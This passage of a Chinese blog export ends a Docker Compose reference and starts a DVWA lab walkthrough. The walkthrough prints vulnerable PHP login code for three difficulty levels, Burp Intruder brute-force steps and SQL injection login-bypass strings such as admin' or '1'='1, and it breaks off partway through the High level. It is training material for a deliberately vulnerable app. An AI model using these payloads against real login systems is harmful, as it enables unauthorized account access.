<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">&quot;3.1&quot;</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line"></span><br><span class="line"><span class="attr">mysql:</span></span><br><span class="line">  <span class="attr">image:</span> <span class="string">mysql</span></span><br><span class="line">  <span class="attr">environment:</span></span><br><span class="line">    <span class="attr">MYSQL_ROOT_PASSWORD_FILE:</span> <span class="string">/run/secrets/db_root_password</span></span><br><span class="line">  <span class="attr">secrets:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">db_root_password</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">my_other_secret</span></span><br><span class="line"></span><br><span class="line"><span class="attr">secrets:</span></span><br><span class="line">  <span class="attr">my_secret:</span></span><br><span class="line">    <span class="attr">file:</span> <span class="string">./my_secret.txt</span></span><br><span class="line">  <span class="attr">my_other_secret:</span></span><br><span class="line">    <span class="attr">external:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure>
<h2 id="security-opt"><a href="#security-opt" class="headerlink" title="security_opt"></a><a href="https://funtl.com/zh/docs-docker/Docker-Compose-模板文件.html#security-opt"><code>security_opt</code></a></h2><p>指定容器模板标签（label）机制的默认属性（用户、角色、类型、级别等）。例如配置标签的用户名和角色名。</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">security_opt:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">label:user:USER</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">label:role:ROLE</span></span><br></pre></td></tr></table></figure>
<h2 id="stop-signal"><a href="#stop-signal" class="headerlink" title="stop_signal"></a><a href="https://funtl.com/zh/docs-docker/Docker-Compose-模板文件.html#stop-signal"><code>stop_signal</code></a></h2><p>设置另一个信号来停止容器。在默认情况下使用的是 SIGTERM 停止容器。</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">stop_signal:</span> <span class="string">SIGUSR1</span></span><br></pre></td></tr></table></figure>
<h2 id="sysctls"><a href="#sysctls" class="headerlink" title="sysctls"></a><a href="https://funtl.com/zh/docs-docker/Docker-Compose-模板文件.html#sysctls"><code>sysctls</code></a></h2><p>配置容器内核参数。</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">sysctls:</span></span><br><span class="line">  <span class="attr">net.core.somaxconn:</span> <span class="number">1024</span></span><br><span class="line">  <span class="attr">net.ipv4.tcp_syncookies:</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="attr">sysctls:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">net.core.somaxconn=1024</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">net.ipv4.tcp_syncookies=0</span></span><br></pre></td></tr></table></figure>
<h2 id="ulimits"><a href="#ulimits" class="headerlink" title="ulimits"></a><a href="https://funtl.com/zh/docs-docker/Docker-Compose-模板文件.html#ulimits"><code>ulimits</code></a></h2><p>指定容器的 ulimits 限制值。</p>
<p>例如，指定最大进程数为 65535，指定文件句柄数为 20000（软限制，应用可以随时修改，不能超过硬限制） 和 40000（系统硬限制，只能 root 用户提高）。</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">ulimits:</span></span><br><span class="line">  <span class="attr">nproc:</span> <span class="number">65535</span></span><br><span class="line">  <span class="attr">nofile:</span></span><br><span class="line">    <span class="attr">soft:</span> <span class="number">20000</span></span><br><span class="line">    <span class="attr">hard:</span> <span class="number">40000</span></span><br></pre></td></tr></table></figure>
<h2 id="volumes"><a href="#volumes" class="headerlink" title="volumes"></a><a href="https://funtl.com/zh/docs-docker/Docker-Compose-模板文件.html#volumes"><code>volumes</code></a></h2><p>数据卷所挂载路径设置。可以设置宿主机路径 （<code>HOST:CONTAINER</code>） 或加上访问模式 （<code>HOST:CONTAINER:ro</code>）。</p>
<p>该指令中路径支持相对路径。</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">volumes:</span></span><br><span class="line"> <span class="bullet">-</span> <span class="string">/var/lib/mysql</span></span><br><span class="line"> <span class="bullet">-</span> <span class="string">cache/:/tmp/cache</span></span><br><span class="line"> <span class="bullet">-</span> <span class="string">~/configs:/etc/configs/:ro</span></span><br></pre></td></tr></table></figure>
<h2 id="其它指令"><a href="#其它指令" class="headerlink" title="其它指令"></a><a href="https://funtl.com/zh/docs-docker/Docker-Compose-模板文件.html#其它指令">其它指令</a></h2><p>此外，还有包括 <code>domainname, entrypoint, hostname, ipc, mac_address, privileged, read_only, shm_size, restart, stdin_open, tty, user, working_dir</code> 等指令，基本跟 <code>docker run</code> 中对应参数的功能一致。</p>
<p>指定服务容器启动后执行的入口文件。</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">entrypoint:</span> <span class="string">/code/entrypoint.sh</span></span><br></pre></td></tr></table></figure>
<p>指定容器中运行应用的用户名。</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">user:</span> <span class="string">nginx</span></span><br></pre></td></tr></table></figure>
<p>指定容器中工作目录。</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">working_dir:</span> <span class="string">/code</span></span><br></pre></td></tr></table></figure>
<p>指定容器中搜索域名、主机名、mac 地址等。</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">domainname:</span> <span class="string">your_website.com</span></span><br><span class="line"><span class="attr">hostname:</span> <span class="string">test</span></span><br><span class="line"><span class="attr">mac_address:</span> <span class="number">08</span><span class="number">-00</span><span class="number">-27</span><span class="number">-00</span><span class="string">-0C-0A</span></span><br></pre></td></tr></table></figure>
<p>允许容器中运行一些特权命令。</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">privileged:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure>
<p>1</p>
<p>指定容器退出后的重启策略为始终重启。该命令对保持服务始终运行十分有效，在生产环境中推荐配置为 <code>always</code> 或者 <code>unless-stopped</code>。</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">restart:</span> <span class="string">always</span></span><br></pre></td></tr></table></figure>
<p>以只读模式挂载容器的 root 文件系统，意味着不能对容器内容进行修改。</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">read_only:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure>
<p>打开标准输入，可以接受外部输入。</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">stdin_open:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure>
<p>模拟一个伪终端。</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">tty:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure>
<h2 id="读取变量"><a href="#读取变量" class="headerlink" title="读取变量"></a><a href="https://funtl.com/zh/docs-docker/Docker-Compose-模板文件.html#读取变量">读取变量</a></h2><p>Compose 模板文件支持动态读取主机的系统环境变量和当前目录下的 <code>.env</code> 文件中的变量。</p>
<p>例如，下面的 Compose 文件将从运行它的环境中读取变量 <code>$&#123;MONGO_VERSION&#125;</code> 的值，并写入执行的指令中。</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">&quot;3&quot;</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line"></span><br><span class="line"><span class="attr">db:</span></span><br><span class="line">  <span class="attr">image:</span> <span class="string">&quot;mongo:$&#123;MONGO_VERSION&#125;&quot;</span></span><br></pre></td></tr></table></figure>
<p>如果执行 <code>MONGO_VERSION=3.2 docker-compose up</code> 则会启动一个 <code>mongo:3.2</code> 镜像的容器；如果执行 <code>MONGO_VERSION=2.8 docker-compose up</code> 则会启动一个 <code>mongo:2.8</code> 镜像的容器。</p>
<p>若当前目录存在 <code>.env</code> 文件，执行 <code>docker-compose</code> 命令时将从该文件中读取变量。</p>
<p>在当前目录新建 <code>.env</code> 文件并写入以下内容。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 支持 # 号注释</span></span><br><span class="line">MONGO_VERSION=3.6</span><br></pre></td></tr></table></figure>
<p>执行 <code>docker-compose up</code> 则会启动一个 <code>mongo:3.6</code> 镜像的容器。</p>
<h1 id="Docker-入门实践"><a href="#Docker-入门实践" class="headerlink" title="Docker 入门实践"></a>Docker 入门实践</h1><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker pull dockerpracticesig/docker_practice</span><br><span class="line"></span><br><span class="line">docker run -it --rm -p 4000：80 dockerpracticesig/docker_practice</span><br><span class="line"></span><br><span class="line">127.0.0.1:4000</span><br><span class="line"></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Docker</category>
      </categories>
      <tags>
        <tag>Docker</tag>
      </tags>
  </entry>
  <entry>
    <title>DVWA通关过程</title>
    <url>/posts/3eeec4be/</url>
    <content><![CDATA[<h1 id="搭建"><a href="#搭建" class="headerlink" title="搭建"></a>搭建</h1><h2 id="准备："><a href="#准备：" class="headerlink" title="准备："></a>准备：</h2><p><strong>phpStudy</strong></p>
<p><a href="https://github.com/digininja/DVWA">DVWA</a></p>
<h2 id="配置hosts"><a href="#配置hosts" class="headerlink" title="配置hosts"></a>配置hosts</h2><p><code>dvwa.loacl</code> 为靶机</p>
<p><code>hack.loacl</code> 为攻击机</p>
<h2 id="修改配置"><a href="#修改配置" class="headerlink" title="修改配置"></a>修改配置</h2><figure class="highlight ini"><figcaption><span>$phpstudy\PHPTutorial\WWW\DVWA\php.ini</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="attr">magic_quotes_gpc</span> = <span class="literal">Off</span></span><br><span class="line"></span><br><span class="line"><span class="attr">alLow_url_fopen</span> = <span class="literal">on</span></span><br><span class="line"></span><br><span class="line"><span class="attr">alLow_url_include</span> = <span class="literal">on</span></span><br></pre></td></tr></table></figure>
<a id="more"></a>
<figure class="highlight php"><figcaption><span>$phpstudy\PHPTutorial\WWW\DVWA\config\config.inc.php</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="variable">$_DVWA</span>[ ‘db_server’ ] = ‘<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>’;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_DVWA</span>[ ‘db_database’ ] = ‘dvwa’;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_DVWA</span>[ ‘db_user’ ] = ‘root’;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_DVWA</span>[ ‘db_password’ ] = ‘root’;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Only used with PostgreSQL/PGSQL database selection.</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$_DVWA</span>[ <span class="string">&#x27;db_port &#x27;</span>] = ‘<span class="number">5432</span>’;</span><br><span class="line"></span><br><span class="line"><span class="comment"># ReCAPTCHA settings</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Used for the ‘Insecure CAPTCHA’ module</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># You’ll need to generate your own keys at: https://www.google.com/recaptcha/admin</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$_DVWA</span>[ ‘recaptcha_public_key’ ] = ‘<span class="number">6</span>LdK7xITAAzzAAJQTfL7fu6I<span class="number">-0</span>aPl8KHHieAT_yJg’;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_DVWA</span>[ ‘recaptcha_private_key’ ] = ‘<span class="number">6</span>LdK7xITAzzAAL_uw9YXVUOPoIHPZLfw2K1n5NVQ’;</span><br></pre></td></tr></table></figure>
<h2 id="访问"><a href="#访问" class="headerlink" title="访问"></a>访问</h2><p><code>http://ip/dvwa</code></p>
<p><code>admin</code></p>
<p><code>password</code></p>
<p><code>Setup / Reset DB</code> &gt;&gt; <code>Create / Reset Database</code></p>
<p><code>DVWA Security</code> 可设置难度等级： <code>low</code>、<code>Medium</code>、<code>High</code>、<code>Impossible</code></p>
<h1 id="Brute-Force-爆破"><a href="#Brute-Force-爆破" class="headerlink" title="Brute Force (爆破)"></a>Brute Force (爆破)</h1><p>利用密码字典，通过枚举法拆解出用户口令</p>
<h2 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h2><h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;Login&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get username</span></span><br><span class="line">    <span class="variable">$user</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;username&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get password</span></span><br><span class="line">    <span class="variable">$pass</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;password&#x27;</span> ];</span><br><span class="line">    <span class="variable">$pass</span> = md5( <span class="variable">$pass</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check the database</span></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;SELECT * FROM `users` WHERE user = &#x27;<span class="subst">$user</span>&#x27; AND password = &#x27;<span class="subst">$pass</span>&#x27;;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = mysqli_query(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = mysqli_connect_error()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$result</span> &amp;&amp; mysqli_num_rows( <span class="variable">$result</span> ) == <span class="number">1</span> ) &#123;</span><br><span class="line">        <span class="comment">// Get users details</span></span><br><span class="line">        <span class="variable">$row</span>    = mysqli_fetch_assoc( <span class="variable">$result</span> );</span><br><span class="line">        <span class="variable">$avatar</span> = <span class="variable">$row</span>[<span class="string">&quot;avatar&quot;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Login successful</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Welcome to the password protected area <span class="subst">&#123;$user&#125;</span>&lt;/p&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=\&quot;<span class="subst">&#123;$avatar&#125;</span>\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Login failed</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null(<span class="variable">$___mysqli_res</span> = mysqli_close(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : <span class="variable">$___mysqli_res</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>只使用<code>isset</code>函数(php中监测变量是否设置，返回布尔值)验证参数Login是否被设置，没有任何防护机制，对<code>username</code>、<code>password</code>未作任何过滤存在明显的SQL注入漏洞。</p>
</blockquote>
<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><h4 id="密码爆破"><a href="#密码爆破" class="headerlink" title="密码爆破"></a>密码爆破</h4><ul>
<li><p>浏览器启用代理: <code>127.0.0.1:8080</code></p>
</li>
<li><p>Burp Suite Pro ： <code>Proxy</code>(代理) &gt;&gt; <code>Options</code>(选项) &gt;&gt; <code>Proxy Listeners</code>(代理监听器)</p>
</li>
<li><p>浏览器访问 <code>Brute Force</code> 输入用户名和密码后，点击 <code>Login</code> 按钮</p>
</li>
<li><p>Burp Suite Pro 截获了数据包，<code>Proxy</code>(代理) &gt;&gt; <code>Intercept</code>(截断) </p>
<p><code>Forward</code>(发送) , <code>Drop</code>(丢弃) , <code>Intercept is on</code>(拦截启用) / <code>Intercept is off</code>(拦截禁用) , <code>Action</code>(操作)</p>
</li>
</ul>
<ul>
<li>将拦截数据发到 <code>Intruder</code> 模块(<code>Action &gt;&gt; Send to Intruder</code> / <code>Ctrl+I</code>) &gt;&gt; <code>Positions</code> &gt;&gt; <code>Attack type</code> 为 <code>Sniper</code> &gt;&gt; <code>Clear $</code> 清除所有 <script type="math/tex">` 符号 >> **需要爆破密码**所以将 `</script> 符添加到password参数上<code>password=$password$</code> &gt;&gt; <code>Payloads</code> 载入字典 &gt;&gt; <code>Start attack</code> 进行爆破，枚举尝试完字典中的所有文件后，比较响应长度(<code>Length</code>) “与众不同”的推测为正确密码，可在 <code>Response &gt;&gt; Render</code> 浏览网页验证结果</li>
</ul>
<h4 id="手工SQL注入"><a href="#手工SQL注入" class="headerlink" title="手工SQL注入"></a>手工SQL注入</h4><ol>
<li><p>Username:<code>admin&#39; or &#39;1&#39;=&#39;1</code><br>Password:(空)</p>
</li>
</ol>
<p>2.</p>
<p>Username:<code>admin&#39; #</code><br>Password:(空)</p>
<h2 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h2><h3 id="源码-1"><a href="#源码-1" class="headerlink" title="源码"></a>源码</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;Login&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Sanitise username input</span></span><br><span class="line">    <span class="variable">$user</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;username&#x27;</span> ];</span><br><span class="line">    <span class="variable">$user</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$user</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitise password input</span></span><br><span class="line">    <span class="variable">$pass</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;password&#x27;</span> ];</span><br><span class="line">    <span class="variable">$pass</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$pass</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">    <span class="variable">$pass</span> = md5( <span class="variable">$pass</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check the database</span></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;SELECT * FROM `users` WHERE user = &#x27;<span class="subst">$user</span>&#x27; AND password = &#x27;<span class="subst">$pass</span>&#x27;;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = mysqli_query(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = mysqli_connect_error()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$result</span> &amp;&amp; mysqli_num_rows( <span class="variable">$result</span> ) == <span class="number">1</span> ) &#123;</span><br><span class="line">        <span class="comment">// Get users details</span></span><br><span class="line">        <span class="variable">$row</span>    = mysqli_fetch_assoc( <span class="variable">$result</span> );</span><br><span class="line">        <span class="variable">$avatar</span> = <span class="variable">$row</span>[<span class="string">&quot;avatar&quot;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Login successful</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Welcome to the password protected area <span class="subst">&#123;$user&#125;</span>&lt;/p&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=\&quot;<span class="subst">&#123;$avatar&#125;</span>\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Login failed</span></span><br><span class="line">        sleep( <span class="number">2</span> );</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null(<span class="variable">$___mysqli_res</span> = mysqli_close(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : <span class="variable">$___mysqli_res</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>较Low级增加了 <code>mysqli_real_escape_string</code> 函数，对字符串中的特殊字符(<code>NUL(\x00)</code>、<code>\n</code>、<code>\r</code>、<code>\</code>、<code>&#39;</code>、<code>&quot;</code> 和 <code>^Z(\x1a)</code>) 进行转义，基本上能防御SQL注入工具(MySQL5.5.37以下版本设置编码为GBK，能构造编码绕过对单引号的转义)；<code>$pass</code> 做了MD5校验，杜绝了参数password进行SQL注入的可能性，但仍然没有有效的防爆破机制，<code>sleep(2)</code> 仅延迟执行2秒。</p>
<p><code>mysqli_real_escape_string</code> : <a href="https://www.runoob.com/php/func-mysqli-real-escape-string.html">1</a> , <a href="https://www.w3school.com.cn/php/func_mysql_real_escape_string.asp">2</a></p>
</blockquote>
<h3 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>SQL注入无效，仍可用Burpsute爆破</p>
<h2 id="High"><a href="#High" class="headerlink" title="High"></a>High</h2><h3 id="源码-2"><a href="#源码-2" class="headerlink" title="源码"></a>源码</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;Login&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;user_token&#x27;</span> ], <span class="variable">$_SESSION</span>[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitise username input</span></span><br><span class="line">    <span class="variable">$user</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;username&#x27;</span> ];</span><br><span class="line">    <span class="variable">$user</span> = stripslashes( <span class="variable">$user</span> );</span><br><span class="line">    <span class="variable">$user</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$user</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitise password input</span></span><br><span class="line">    <span class="variable">$pass</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;password&#x27;</span> ];</span><br><span class="line">    <span class="variable">$pass</span> = stripslashes( <span class="variable">$pass</span> );</span><br><span class="line">    <span class="variable">$pass</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$pass</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">    <span class="variable">$pass</span> = md5( <span class="variable">$pass</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database</span></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;SELECT * FROM `users` WHERE user = &#x27;<span class="subst">$user</span>&#x27; AND password = &#x27;<span class="subst">$pass</span>&#x27;;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = mysqli_query(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = mysqli_connect_error()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$result</span> &amp;&amp; mysqli_num_rows( <span class="variable">$result</span> ) == <span class="number">1</span> ) &#123;</span><br><span class="line">        <span class="comment">// Get users details</span></span><br><span class="line">        <span class="variable">$row</span>    = mysqli_fetch_assoc( <span class="variable">$result</span> );</span><br><span class="line">        <span class="variable">$avatar</span> = <span class="variable">$row</span>[<span class="string">&quot;avatar&quot;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Login successful</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Welcome to the password protected area <span class="subst">&#123;$user&#125;</span>&lt;/p&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=\&quot;<span class="subst">&#123;$avatar&#125;</span>\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Login failed</span></span><br><span class="line">        sleep( rand( <span class="number">0</span>, <span class="number">3</span> ) );</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null(<span class="variable">$___mysqli_res</span> = mysqli_close(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : <span class="variable">$___mysqli_res</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>加入Token，可防御CSRF攻击，同时也增加了爆破的难度，登录验证需要四个参数: <code>username</code>、<code>password</code>、<code>Login</code>、<code>user_token</code>。</p>
<p>每次服务器返回的登录页都包含一个随机值<code>user_token</code>,用户每次登录时都需一起提交<code>user_token</code>,服务器收到请求后会先做token的检查，再进行SQL查询。</p>
<p>同时使用了<code>stripslashes</code>(去除字符串中反斜线字符，若有两个则去除一个)、<code>mysqli_real_escape_string</code>对参数<code>username</code>、<code>password</code>进行过滤、转义,进一步防御SQL注入。</p>
</blockquote>
<h3 id="漏洞利用-2"><a href="#漏洞利用-2" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p><code>Intruder</code></p>
<ul>
